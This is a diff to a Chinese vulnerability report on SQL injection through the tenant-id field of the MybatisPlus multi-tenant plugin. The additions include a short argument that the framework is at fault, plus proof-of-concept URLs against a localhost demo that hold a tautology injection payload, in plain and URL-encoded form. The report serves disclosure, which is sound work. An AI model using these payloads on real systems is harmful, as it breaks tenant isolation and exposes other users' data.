@@ -1,6 +1,17 @@
 
 # MybatisPlus多租户插件SQL注入
 
+## 0. 这个漏洞是不是框架的问题？
+
+租户id字段的拼接行为由框架完成，能造成注入的原因即包括调用框架的应用本身没有对租户id做过滤处理，也包括框架本身不合适的字段拼接行为
+
+但是本质上触发漏洞的原因是框架不合适的字段拼接行为。
+
+我认为开发团队即使不去修复，也要对用户有足够的提醒。
+
+![Pasted image 20230201150219.png](./images/Pasted%20image%2020230201150219.png)
+
+
 ## 1. 漏洞总结
 
 威胁：SQL注入
@@ -60,8 +71,17 @@ CREATE TABLE `users` (
 `http://localhost:8080/user?tid=`
 ![Pasted image 20230201155910.png](./images/Pasted%20image%2020230201155910.png)
 
+`http://localhost:8080/user?tid=19065dc6-a14a-11ed-ba3f-864b77a22e79`
+![1](./images/Pasted%20image%2020230201182920.png)
+
 注入：`' or 1=1 and '123'='123`
+
+`http://localhost:8080/user?tid=' or 1=1 and '123'='123`
+
 ![Pasted image 20230201155957.png](./images/Pasted%20image%2020230201155957.png)
+
+`http://localhost:8080/user?tid=19065dc6-a14a-11ed-ba3f-864b77a22e79%27%20or%201=1%20and%20%271%27=%271`
+![2](./images/Pasted%20image%2020230201182932.png)
 
 
 ## 3. 漏洞触发细节
